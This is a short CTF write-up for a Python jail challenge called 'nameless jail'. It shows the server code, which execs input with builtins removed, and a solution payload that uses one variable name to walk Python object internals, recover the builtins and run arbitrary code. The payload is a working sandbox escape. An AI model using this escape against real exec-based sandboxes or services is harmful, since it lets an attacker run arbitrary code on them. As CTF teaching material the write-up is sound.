# nameless jail

made by other quasar and A~Z

## challenge

server.py
```py
#!/usr/bin/env python3
import dis

print("Welcome to the python calculator!", "Due to hardware restrictions we allow only one variable.", sep='\n')

if __name__ == '__main__':
    try:
        math = input('> ')
        info = dis.code_info(math).split('\n')
        assert 'code object' not in ''.join(info)

        if 'Names:' in info:
            for line in info[info.index('Names:'):]:
                assert '1:' not in line

        exec(math, { '__builtins__': None }, results := {})
        for var, res in results.items():
            print(f"{var} = {res}")

    except Exception as e:
        raise e
        print("smh")
```

## solution

Uses a single name (`__getattribute__`) to access loaded modules and load `os`. we use a dictionary here, for example

```py
__getattribute__={}
__getattribute__['g']=None.__getattribute__('__class__').__getattribute__
__getattribute__['t']=__getattribute__['g']((),'__class__')
__getattribute__['o']=__getattribute__['g'](__getattribute__['t'],'__mro__')[-1]
__getattribute__['wp']=__getattribute__['g'](__getattribute__['o'],'__subclasses__')()[132]
__getattribute__['i']=__getattribute__['g'](__getattribute__['wp'],'__init__')
__getattribute__['b']=__getattribute__['g'](__getattribute__['i'],'__globals__')['__builtins__']
__getattribute__['b']['exec'](__getattribute__['b']['input'](), {'__builtins__':__getattribute__['b']})
```

